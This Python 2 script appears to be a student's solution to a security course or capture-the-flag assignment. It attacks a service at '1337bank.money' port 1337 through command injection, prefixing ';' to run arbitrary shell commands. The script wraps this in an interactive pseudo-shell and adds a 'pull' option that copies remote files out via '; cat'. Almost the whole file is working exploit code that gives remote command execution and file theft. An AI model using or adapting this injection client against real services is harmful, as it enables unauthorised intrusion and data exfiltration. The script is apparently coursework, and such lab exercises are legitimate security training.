import sys
import re
import os

"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
    """
            # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

        #Reading:

    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
#    print(data)             # Prints data

        #Sending:
    s.send(cmd + "\n")   # Send a newline \n at the end of your command
    data = s.recv(2000)
    #print(cmd)
    data = s.recv(1024)
    return str(data)



if __name__ == '__main__':
    while (True):
        option = raw_input("> ")
        if option == 'shell': #shell begins here
            history = []  #this implentation is inefficient on space allocation :(
            dir = "/"
            while (True):
                #print("dir is: " + dir)
                sys.stdout.write(dir)
                single_cmd = raw_input("> ")
                if single_cmd == 'quit':
                    break
                cmd = "";
                for x in history:
                    cmd += ";"
                    cmd += x
                print(execute_cmd(cmd + ";" + single_cmd).strip('\n'))
                if re.match("^\s*cd \S*\s?$", single_cmd): #if its a change of directory, keep it in the history
                    history.append(single_cmd)
                for x in history:
                    cmd += ";"
                    cmd += x
                dir = (execute_cmd(cmd + ";pwd")).strip('\n') #setting up next shell prompt

        elif re.search("^pull \S+ \S+$", option):
            path = re.split("\s", option)
            f0 = open(path[2], 'w+')
            content = execute_cmd("; cat " + path[1])
            f0.write(content)
            f0.close

        elif option == 'quit':
            break
        else:
            print("1. shell\n2. pull <remote-path> <local-path>\n3. help\n4. quit")
